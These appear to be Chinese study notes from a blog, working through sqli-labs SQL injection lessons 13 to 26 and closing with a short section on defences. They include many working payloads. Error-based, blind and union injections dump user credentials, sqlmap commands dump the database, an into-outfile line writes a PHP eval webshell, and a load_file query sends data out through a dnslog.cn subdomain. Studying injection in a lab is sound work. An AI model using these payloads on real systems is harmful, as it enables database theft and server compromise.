+<h3 id="Less-13：-闭合-—-无回显，用报错注入"><a href="#Less-13：-闭合-—-无回显，用报错注入" class="headerlink" title="Less-13：&#39;) 闭合 — 无回显，用报错注入"></a>Less-13：<code>&#39;)</code> 闭合 — 无回显，用报错注入</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 报错注入</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27;) and extractvalue(1,concat(0x7e,(select database()),0x7e))--+&amp;passwd=test&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 时间盲注</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span>) <span class="keyword">and</span> if(length(database())<span class="operator">=</span><span class="number">8</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)<span class="comment">--+&amp;passwd=test&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-14：-闭合-—-无回显"><a href="#Less-14：-闭合-—-无回显" class="headerlink" title="Less-14：&quot; 闭合 — 无回显"></a>Less-14：<code>&quot;</code> 闭合 — 无回显</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin&quot; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+&amp;passwd=test&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-15：布尔盲注"><a href="#Less-15：布尔盲注" class="headerlink" title="Less-15：布尔盲注"></a>Less-15：布尔盲注</h3><p>无报错回显，通过登录成功&#x2F;失败判断：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 判断数据库长度</span><br><span class="line">uname<span class="operator">=</span>admin<span class="string">&#x27; and length(database())=8--+&amp;passwd=test&amp;submit=Submit</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 逐字爆破</span></span><br><span class="line"><span class="string">uname=admin&#x27;</span> <span class="keyword">and</span> ascii(substr((<span class="keyword">select</span> database()),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">=</span><span class="number">115</span><span class="comment">--+&amp;passwd=test&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-16：-闭合-布尔盲注"><a href="#Less-16：-闭合-布尔盲注" class="headerlink" title="Less-16：&quot;) 闭合 + 布尔盲注"></a>Less-16：<code>&quot;)</code> 闭合 + 布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname<span class="operator">=</span>admin&quot;) and length(database())=8--+&amp;passwd=test&amp;submit=Submit</span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-17：UPDATE-注入（改密码处）"><a href="#Less-17：UPDATE-注入（改密码处）" class="headerlink" title="Less-17：UPDATE 注入（改密码处）"></a>Less-17：UPDATE 注入（改密码处）</h3><p>注入点在 <code>new password</code> 字段（username 做了过滤）：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 后端: <span class="keyword">UPDATE</span> users <span class="keyword">SET</span> password<span class="operator">=</span><span class="string">&#x27;新密码&#x27;</span> <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span></span><br><span class="line">username: admin</span><br><span class="line"><span class="keyword">new</span> password: <span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(0x7e,(select database()),0x7e))#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="POST-注入工具速查"><a href="#POST-注入工具速查" class="headerlink" title="POST 注入工具速查"></a>POST 注入工具速查</h3><table>
+<thead>
+<tr>
+<th>工具</th>
+<th>操作方式</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Burp Suite</td>
+<td>抓包 → Repeater → 修改 POST body</td>
+</tr>
+<tr>
+<td>HackBar</td>
+<td>F12 调出 → 勾选 POST → 填入参数</td>
+</tr>
+<tr>
+<td>sqlmap</td>
+<td><code>sqlmap -u &quot;URL&quot; --data=&quot;user=admin&amp;pass=1&quot;</code></td>
+</tr>
+<tr>
+<td>curl</td>
+<td><code>curl -X POST -d &quot;user=admin&amp;pass=1&#39; or 1=1#&quot; URL</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="Cookie-注入"><a href="#Cookie-注入" class="headerlink" title="Cookie 注入"></a>Cookie 注入</h2><h3 id="Cookie-是什么"><a href="#Cookie-是什么" class="headerlink" title="Cookie 是什么"></a>Cookie 是什么</h3><p>Cookie 是在 HTTP 协议下，服务器或脚本可以维护客户工作站上信息的一种方式。通常用于<strong>辨别用户身份、进行 session 跟踪</strong>，最典型的应用是保存用户账号密码用来自动登录，以及电商网站的”购物车”。</p>
+<h3 id="Cookie-注入识别步骤"><a href="#Cookie-注入识别步骤" class="headerlink" title="Cookie 注入识别步骤"></a>Cookie 注入识别步骤</h3><ol>
+<li>寻找形如 <code>.asp?id=xx</code> 的带参数 URL</li>
+<li>去掉参数测试页面是否仍正常（验证参数是否通过 Cookie 传递）</li>
+<li>测试应用是否用 <code>Request(&quot;id&quot;)</code> 获取数据（同时接受 GET&#x2F;POST&#x2F;Cookie）</li>
+<li>将注入语句带入 URL（和常规注入一样），分别返回正常&#x2F;异常则存在注入</li>
+<li>使用常规注入语句进行注入</li>
+</ol>
+<h3 id="特点-1"><a href="#特点-1" class="headerlink" title="特点"></a>特点</h3><p>注入点在 HTTP 请求头的 <code>Cookie</code> 字段中。Less-20 登录后，后端会从 Cookie 的 <code>uname</code> 字段取值拼入 SQL：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> username<span class="operator">=</span><span class="string">&#x27;$cookie_uname&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="判断闭合-3"><a href="#判断闭合-3" class="headerlink" title="判断闭合"></a>判断闭合</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span>admin<span class="string">&#x27; union select 1,2,3</span></span><br></pre></td></tr></table></figure>
+
+<p>报错发现 <code>&#39; LIMIT 0,1</code> 后缀 → 闭合方式为 <code>&#39;</code>，且末尾有 <code>LIMIT</code>，需用 <code>#</code> 注释。</p>
+<h3 id="查数据库"><a href="#查数据库" class="headerlink" title="查数据库"></a>查数据库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="string">&#x27; union select 1,2,database()#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="脱库-2"><a href="#脱库-2" class="headerlink" title="脱库"></a>脱库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: uname<span class="operator">=</span><span class="string">&#x27; union select 1,2,(select group_concat(username,0x3a,password) from users)#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="sqlmap-注入-Cookie"><a href="#sqlmap-注入-Cookie" class="headerlink" title="sqlmap 注入 Cookie"></a>sqlmap 注入 Cookie</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-20/&quot;</span> --cookie=<span class="string">&quot;uname=*&quot;</span> --dbs</span><br><span class="line">sqlmap -u <span class="string">&quot;http://192.168.137.133/sql/Less-20/&quot;</span> --cookie=<span class="string">&quot;uname=1*&quot;</span> --technique=U --dump</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><strong>要点：</strong> Cookie 注入与 GET&#x2F;POST 注入原理相同，区别在于注入点位置。需注意用 <code>#</code> 注释掉原语句尾部的 <code>LIMIT</code>。</p>
+</blockquote>
+<hr>
+<h2 id="HTTP-头注入"><a href="#HTTP-头注入" class="headerlink" title="HTTP 头注入"></a>HTTP 头注入</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>部分应用会将 HTTP 请求头（User-Agent、Referer、X-Forwarded-For 等）的值写入数据库（通常是 INSERT 语句），如果未过滤直接拼接，就存在注入点。</p>
+<h3 id="HTTP-请求头结构"><a href="#HTTP-请求头结构" class="headerlink" title="HTTP 请求头结构"></a>HTTP 请求头结构</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Accept: */*</span><br><span class="line">Host: host</span><br><span class="line">User-Agent: Mozilla/5.0 ...</span><br><span class="line">Accept-Language: en-us</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">X-Forwarded-For: ip</span><br><span class="line">Cookie: guest_id=v1%3A1328019064</span><br></pre></td></tr></table></figure>
+
+<h3 id="常见注入头字段"><a href="#常见注入头字段" class="headerlink" title="常见注入头字段"></a>常见注入头字段</h3><table>
+<thead>
+<tr>
+<th>头名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>User-Agent</code></td>
+<td>浏览器标识，常被记录到数据库&#x2F;日志</td>
+</tr>
+<tr>
+<td><code>Referer</code></td>
+<td>来源页，常被记录</td>
+</tr>
+<tr>
+<td><code>Cookie</code></td>
+<td>独立一类（见 Cookie 注入章节）</td>
+</tr>
+<tr>
+<td><code>X-Forwarded-For</code></td>
+<td>客户端 IP（代理场景），可能直接入库</td>
+</tr>
+<tr>
+<td><code>X-Real-IP</code></td>
+<td>客户端真实 IP</td>
+</tr>
+<tr>
+<td><code>Client-IP</code></td>
+<td>客户端 IP（早期字段）</td>
+</tr>
+<tr>
+<td><code>Host</code></td>
+<td>目标主机</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>75% 的 Web 应用扫描器不能发现 HTTP Headers 参数的相关漏洞。</p>
+</blockquote>
+<h3 id="Less-18：User-Agent-注入"><a href="#Less-18：User-Agent-注入" class="headerlink" title="Less-18：User-Agent 注入"></a>Less-18：User-Agent 注入</h3><p>登录 <code>admin:admin</code> 后，后端将 UA 写入 INSERT 语句。</p>
+<h4 id="判断闭合-4"><a href="#判断闭合-4" class="headerlink" title="判断闭合"></a>判断闭合</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>报错 → 闭合方式为 <code>&#39;</code>（两端各一个单引号包裹）。</p>
+<h4 id="报错注入（and-闭合方式）"><a href="#报错注入（and-闭合方式）" class="headerlink" title="报错注入（and 闭合方式）"></a>报错注入（and 闭合方式）</h4><p>前后用 <code>&#39;</code> 闭合原有引号，中间用 <code>and</code> 连接：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and extractvalue(1,concat(0x7e,database())) and&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>即最终拼接为：<code>INSERT INTO ... VALUES (..., &#39;&#39; and extractvalue(...) and&#39;&#39;, ...)</code></p>
+<h4 id="另一种写法（or-注释）"><a href="#另一种写法（or-注释）" class="headerlink" title="另一种写法（or + 注释）"></a>另一种写法（or + 注释）</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">User</span><span class="operator">-</span>Agent: <span class="string">&#x27; or extractvalue(1,concat(0x7e,database())),1,1)#</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="脱库-3"><a href="#脱库-3" class="headerlink" title="脱库"></a>脱库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; or extractvalue(1,concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1))) and&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Less-19：Referer-注入"><a href="#Less-19：Referer-注入" class="headerlink" title="Less-19：Referer 注入"></a>Less-19：Referer 注入</h3><p>登录后页面回显 Referer，注入点在 <code>Referer</code> 头。</p>
+<h4 id="判断闭合-5"><a href="#判断闭合-5" class="headerlink" title="判断闭合"></a>判断闭合</h4><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>报错 → 闭合方式为 <code>&#39;</code>。</p>
+<h4 id="报错注入-1"><a href="#报错注入-1" class="headerlink" title="报错注入"></a>报错注入</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27; or extractvalue(1,concat(0x7e,database())) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>同样用两端的 <code>&#39;</code> 闭合原语句，中间注入报错函数。</p>
+<h4 id="脱库-4"><a href="#脱库-4" class="headerlink" title="脱库"></a>脱库</h4><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: <span class="string">&#x27; or extractvalue(1,concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1))) or&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="常见-HTTP-头注入点"><a href="#常见-HTTP-头注入点" class="headerlink" title="常见 HTTP 头注入点"></a>常见 HTTP 头注入点</h3><table>
+<thead>
+<tr>
+<th>头名称</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>User-Agent</code></td>
+<td>浏览器标识，常被记录到访问日志或数据库</td>
+</tr>
+<tr>
+<td><code>Referer</code></td>
+<td>来源页，常被记录</td>
+</tr>
+<tr>
+<td><code>X-Forwarded-For</code></td>
+<td>客户端 IP（代理场景），可能未过滤直接入库</td>
+</tr>
+<tr>
+<td><code>X-Real-IP</code></td>
+<td>客户端真实 IP</td>
+</tr>
+<tr>
+<td><code>Cookie</code></td>
+<td>独立一类（见 Cookie 注入章节）</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p><strong>Less-18 与 Less-19 的共同点：</strong> 注入点都在 HTTP 请求头，后端将其写入 INSERT 语句。由于 INSERT 通常无直接回显，一般使用报错注入（<code>extractvalue</code> &#x2F; <code>updatexml</code>）。</p>
+</blockquote>
+<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>二次注入分为两步：</p>
+<p><strong>第一步：插入恶意数据。</strong> 第一次向数据库插入数据时，仅对特殊字符进行了转义，写入数据库时保留了原始恶意数据。</p>
+<p><strong>第二步：引用恶意数据。</strong> 数据存入数据库后，开发者认为数据是可信的，再次查询时直接从数据库取出恶意数据，没有做进一步检验和处理，导致注入。</p>
+<blockquote>
+<p><strong>关键在于信任边界：</strong> 数据入库时做了转义但仍保留了恶意内容，后续使用时未再次过滤。</p>
+<p>练习：Less-24</p>
+</blockquote>
+<hr>
+<h2 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h2><h3 id="前置条件"><a href="#前置条件" class="headerlink" title="前置条件"></a>前置条件</h3><p>需要 <code>secure_file_priv</code> 允许：</p>
+<table>
+<thead>
+<tr>
+<th><code>secure_file_priv</code> 值</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>NULL</code></td>
+<td>禁止 mysqld 导入导出</td>
+</tr>
+<tr>
+<td><code>/tmp/</code></td>
+<td>限制导入导出只能在 <code>/tmp/</code> 目录</td>
+</tr>
+<tr>
+<td><code>空</code></td>
+<td>不限制导入导出</td>
+</tr>
+</tbody></table>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> <span class="string">&#x27;secure%&#x27;</span>;   <span class="comment">-- 查看当前配置</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="读文件：load-file"><a href="#读文件：load-file" class="headerlink" title="读文件：load_file()"></a>读文件：load_file()</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> load_file(<span class="string">&#x27;C:/phpstudy_pro/WWW/1.txt&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>路径可用单引号字符串、<code>0x</code> 十六进制、<code>char()</code> 转换</li>
+<li><strong>路径必须用 <code>/</code></strong>，不能用 <code>\</code></li>
+</ul>
+<h3 id="写文件：into-outfile"><a href="#写文件：into-outfile" class="headerlink" title="写文件：into outfile"></a>写文件：into outfile</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">&#x27;&lt;?php @eval($_POST[cmd])?&gt;&#x27;</span> <span class="keyword">into</span> outfile <span class="string">&#x27;C:/phpStudy_pro/WWW/asd.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><code>outfile</code> 后面<strong>不能</strong>接 <code>0x</code> 或 <code>char()</code> 转换的路径</li>
+<li>写文件时 <code>/</code> 和 <code>\\</code> 都可以（<code>\</code> 会被 MySQL 自动去掉一个）</li>
+</ul>
+<h3 id="outfile-与-dumpfile-的区别"><a href="#outfile-与-dumpfile-的区别" class="headerlink" title="outfile 与 dumpfile 的区别"></a>outfile 与 dumpfile 的区别</h3><table>
+<thead>
+<tr>
+<th>特性</th>
+<th>outfile</th>
+<th>dumpfile</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>导出行数</td>
+<td>可导出多行</td>
+<td>只能导出一行</td>
+</tr>
+<tr>
+<td>格式转换</td>
+<td>有特殊格式转换</td>
+<td>保持原数据格式</td>
+</tr>
+<tr>
+<td>适用场景</td>
+<td>文本文件</td>
+<td>二进制文件</td>
+</tr>
+</tbody></table>
+<h3 id="写入路径"><a href="#写入路径" class="headerlink" title="写入路径"></a>写入路径</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># Less<span class="number">-7</span>：<span class="keyword">into</span> outfile 写入 webshell</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;)) union select 1,2,&quot;&lt;?php @eval($_POST[&#x27;</span>change<span class="string">&#x27;]);?&gt;&quot; into outfile &quot;D:\\phpstudy_pro\\WWW\\sqli-labs\\Less-7\\1.php&quot;--+</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="DNSLog-外带查询"><a href="#DNSLog-外带查询" class="headerlink" title="DNSLog 外带查询"></a>DNSLog 外带查询</h2><h3 id="原理-4"><a href="#原理-4" class="headerlink" title="原理"></a>原理</h3><p>通过子查询将数据拼接到域名中，使用 <code>load_file()</code> 访问共享文件，域名被 DNS 服务器记录，从而将<strong>盲注变为显错注入</strong>——在 DNS 日志中直接看到数据。</p>
+<h3 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select load_file(concat(&#x27;</span><span class="operator">/</span><span class="operator">/</span><span class="string">&#x27;,(select database()),&#x27;</span>.f3q4hd.dnslog.cn<span class="operator">/</span>asd<span class="string">&#x27;)))--+</span></span><br></pre></td></tr></table></figure>
+
+<p>成功时 DNS 日志中会出现 <code>security.f3q4hd.dnslog.cn</code> 的解析记录，直接读出数据库名。</p>
+<hr>
+<h2 id="WAF-绕过"><a href="#WAF-绕过" class="headerlink" title="WAF 绕过"></a>WAF 绕过</h2><h3 id="常见绕过方式"><a href="#常见绕过方式" class="headerlink" title="常见绕过方式"></a>常见绕过方式</h3><table>
+<thead>
+<tr>
+<th>方法</th>
+<th>原理</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>大小写混合</strong></td>
+<td>Win 服务器端检测未开启大小写不敏感</td>
+<td><code>UnIon SeLecT</code></td>
+</tr>
+<tr>
+<td><strong>多重关键字（双写）</strong></td>
+<td>服务端检测到敏感字替换为空</td>
+<td><code>ununionion</code> → <code>union</code></td>
+</tr>
+<tr>
+<td><strong>编码绕过</strong></td>
+<td>服务端未检测编码形式关键字</td>
+<td><code>0x61646d696e</code>、<code>%20</code>、<code>%u0020</code></td>
+</tr>
+<tr>
+<td><strong>注释绕过</strong></td>
+<td>服务端未检测注释内的字符串</td>
+<td><code>/*user()*/</code>、<code>/*!union*/</code></td>
+</tr>
+<tr>
+<td><strong>等价函数</strong></td>
+<td>黑名单不完整</td>
+<td><code>mid</code> 代替 <code>substr</code>，<code>like</code> 代替 <code>=</code></td>
+</tr>
+<tr>
+<td><strong>特殊符号</strong></td>
+<td>数据库中效果相同，服务端未限制</td>
+<td>科学记数法 <code>1e0</code>，空白字符 <code>%09%0A%0B%0C%0D%A0</code></td>
+</tr>
+<tr>
+<td><strong>组合绕过</strong></td>
+<td>多位置过滤需组合多种方式</td>
+<td><code>id=1&#39;and/**/&#39;1&#39;like&#39;2&#39;/**//*!12345union*/select 1,2,3</code></td>
+</tr>
+</tbody></table>
+<h3 id="等价函数速查"><a href="#等价函数速查" class="headerlink" title="等价函数速查"></a>等价函数速查</h3><table>
+<thead>
+<tr>
+<th>类别</th>
+<th>可替换函数</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>报错查询</td>
+<td><code>updatexml</code>、<code>extractvalue</code>、<code>floor(rand*2)</code>、<code>exp</code></td>
+</tr>
+<tr>
+<td>字符串截取</td>
+<td><code>mid</code>、<code>substr</code>、<code>substring</code>、<code>substrB</code>、<code>left</code></td>
+</tr>
+<tr>
+<td>字符串连接</td>
+<td><code>concat</code>、<code>group_concat</code>、<code>concat_ws</code></td>
+</tr>
+<tr>
+<td>字符串转换</td>
+<td><code>char</code>、<code>hex</code>、<code>unhex</code></td>
+</tr>
+<tr>
+<td>替换等号</td>
+<td><code>like</code>、<code>rlike</code>、<code>regexp</code></td>
+</tr>
+<tr>
+<td>替换空格</td>
+<td><code>%09</code>、<code>%0A</code>、<code>%0B</code>、<code>%0C</code>、<code>%0D</code>、<code>%A0</code>、<code>/**/</code>、<code>()</code></td>
+</tr>
+</tbody></table>
+<h3 id="特殊注释绕过（Less-23-示例）"><a href="#特殊注释绕过（Less-23-示例）" class="headerlink" title="特殊注释绕过（Less-23 示例）"></a>特殊注释绕过（Less-23 示例）</h3><p>注释符 <code>#</code>、<code>--+</code> 被过滤时，用 <code>or &#39;1&#39;=&#39;1</code> 闭合尾部：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database();%00</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> database()),<span class="number">3</span> <span class="keyword">or</span> <span class="string">&#x27;1&#x27;</span><span class="operator">=</span><span class="string">&#x27;1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="空格绕过（Less-26-示例）"><a href="#空格绕过（Less-26-示例）" class="headerlink" title="空格绕过（Less-26 示例）"></a>空格绕过（Less-26 示例）</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%09union%09select%091,2,database()oorr%09&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;%26%26extractvalue(1,concat(0x7e,database(),0x7e))||&#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="绕狗实战思路"><a href="#绕狗实战思路" class="headerlink" title="绕狗实战思路"></a>绕狗实战思路</h3><ol>
+<li><strong>定位黑名单</strong>：逐个测试关键字、空格、注释，确定哪些被拦截</li>
+<li><strong>FUZZ 爆破</strong>：使用内联注释 <code>/*!XXXXX*/</code> 中的数字进行 fuzz，找出可绕过的版本号</li>
+<li><strong>组合利用</strong>：将大小写、双写、编码、注释等多种方式组合</li>
+</ol>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 内联注释 FUZZ 示例（爆破中间的数字）</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union/*//*//*!50144select*//*//*/1,2,3--+</span></span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="SQL-注入防御"><a href="#SQL-注入防御" class="headerlink" title="SQL 注入防御"></a>SQL 注入防御</h2><h3 id="代码层防御"><a href="#代码层防御" class="headerlink" title="代码层防御"></a>代码层防御</h3><p><strong>过滤特殊符号（addslashes）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在预定义字符前加反斜杠：&#x27;、&quot;、\、NULL</span></span><br><span class="line"><span class="title function_ invoke__">addslashes</span>(<span class="variable">$input</span>);</span><br></pre></td></tr></table></figure>
+
+<p><strong>正则过滤：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">replaceSpecialChar</span>(<span class="params"><span class="variable">$strParam</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$regex</span> = <span class="string">&quot;/\/|\\~|\\!|\\@|\\#|\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\+|\\&#123;|\\&#125;|\\:|\\&lt;|\\&gt;|\\?|\\[|\\]|\\,|\\.|\\/|\\;|\\&#x27;|\\`|\\-|\\=|\\\\|\\|/&quot;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$regex</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$strParam</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="架构层防御"><a href="#架构层防御" class="headerlink" title="架构层防御"></a>架构层防御</h3><ol>
+<li><strong>分级管理</strong>：严格控制用户权限，普通用户禁止数据库增删改权限</li>
+<li><strong>参数传值（预编译）</strong>：禁止将变量直接拼入 SQL，使用 PDO 预处理<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$stmt</span> = <span class="variable">$pdo</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br></pre></td></tr></table></figure></li>
+<li><strong>基础过滤 + 二次过滤</strong>：先做基础过滤，再根据业务场景做针对性二次过滤</li>
+<li><strong>漏洞扫描</strong>：使用专业扫描工具定期发现系统 SQL 注入漏洞</li>
+<li><strong>多层验证</strong>：客户端和系统端都进行有效验证，相互配合</li>
+<li><strong>数据库信息加密</strong>：对敏感数据采用加密存储</li>
+</ol>
+<h3 id="宽字节注入特防"><a href="#宽字节注入特防" class="headerlink" title="宽字节注入特防"></a>宽字节注入特防</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mysql_set_charset</span>(<span class="string">&#x27;gbk&#x27;</span>, <span class="variable">$conn</span>);          <span class="comment">// 指定连接字符集</span></span><br><span class="line"><span class="title function_ invoke__">mysql_real_escape_string</span>(<span class="variable">$input</span>, <span class="variable">$conn</span>);   <span class="comment">// 会考虑当前字符集，不会出现宽字节拼接问题</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>上述两个条件缺一不可。</p>
+</blockquote>
+<hr>
+<h2 id="sqlmap-基础"><a href="#sqlmap-基础" class="headerlink" title="sqlmap 基础"></a>sqlmap 基础</h2><p><strong>详见sqlmap使用</strong></p>
